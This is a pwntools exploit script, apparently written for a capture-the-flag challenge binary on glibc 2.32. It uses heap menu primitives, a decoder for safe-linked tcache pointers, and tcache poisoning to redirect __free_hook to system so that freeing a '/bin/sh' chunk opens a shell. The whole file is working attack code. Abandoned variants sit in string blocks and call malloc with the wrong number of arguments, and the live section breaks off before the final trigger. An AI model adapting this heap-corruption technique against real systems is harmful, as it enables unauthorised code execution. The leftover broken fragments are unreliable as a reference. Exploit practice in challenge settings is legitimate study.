from pwn import *
import re

gs = '''
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
'''

#context.terminal = ['tmux', 'splitw', '-h']
#p=process("./www")
#p=gdb.debug("./moms", gdbscript=gs)
#gdb.attach(p)

p = process("./encrypted")

def malloc(ind, size):
    global p
    r1 = p.sendlineafter(b">", b"1")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">", str(size).encode())
    #r4 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def free(ind):
    global p
    r1 = p.sendlineafter(b">", b"2")
    r2 = p.sendlineafter(b">", str(ind).encode())
    return r1+r2

def edit(ind, payload):
    global p
    r1 = p.sendlineafter(b">", b"3")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def view(ind):
    global p
    r1 = p.sendlineafter(b">", b"4")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.recvuntil(b"You are using")
    return r1+r2+r3

def getleak(resp):
    rleak = resp.split(b"index?\n> ")[1].split(b"\nYou ")[0]
    #print("rleak -> " + rleak.decode())
    return u64(rleak.ljust(8, b"\x00"))


def decrypt(cipher):
    key=0
    for i in range(1,6):
        bits=64-12*i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain
#glibc 2.32 tcache addresses are stored as address ^ (chunk_address>>12)

'''
malloc(0, 24, b"1")
malloc(1, 24, b"2")
malloc(2, 0x421, b"BIG BOI")
malloc(3, 24, b"JON SNOW")
edit(3, b"/bin/sh")
free(2)
resp = view(2)
leak = getleak(resp)
forever = 0x1ecbe0
base = leak - forever
print(hex(base))
free(0)
free(1)
elf = ELF("./libc.so.6")
elf.address = base
free_hook = elf.sym.__free_hook
print("free_hook " + hex(free_hook))
edit(1, p64(free_hook))
s = elf.sym.system
malloc(4, 24, b"HERE")
malloc(5, 24, b"TEST2")
edit(5, p64(s))
free(3)
p.interactive()'''

'''malloc(0, 0x418)
malloc(1, 0x18)
malloc(2, 0x18)
free(0)
free(2)
free(1)
malloc(3, 0x18)
resp=view(3)
encleak=getleak(resp)
heapleak = decrypt(encleak)
print(hex(heapleak))


forever = 0x1ecbe0
base = heapleak - forever
print(hex(base))

elf = ELF("./libc.so.6")
elf.address = base
free_hook = elf.sym.__free_hook
print("free_hook " + hex(free_hook))
s = elf.sym.system

malloc(4, 0x418)
malloc(5, 24)
edit(5, p64(heapleak))
resp2=view(4)
free(3)
glibcleak = getleak(resp2)
p.interactive()'''

malloc(0, 0x421)
malloc(0, 24)
free(0)
malloc(99, 0x431)
encleak = getleak(view(0))
heap = decrypt(encleak)
print(hex(heap))


edit(3, b"/bin/sh")
free(2)
'''resp = view(2)
leak = getleak(resp)'''
forever = 0x1ecbe0
base = heap - forever
print(hex(base))
free(1)
elf = ELF("./libc.so.6")
elf.address = base
free_hook = elf.sym.__free_hook
edit(1, p64(free_hook))
s = elf.sym.system

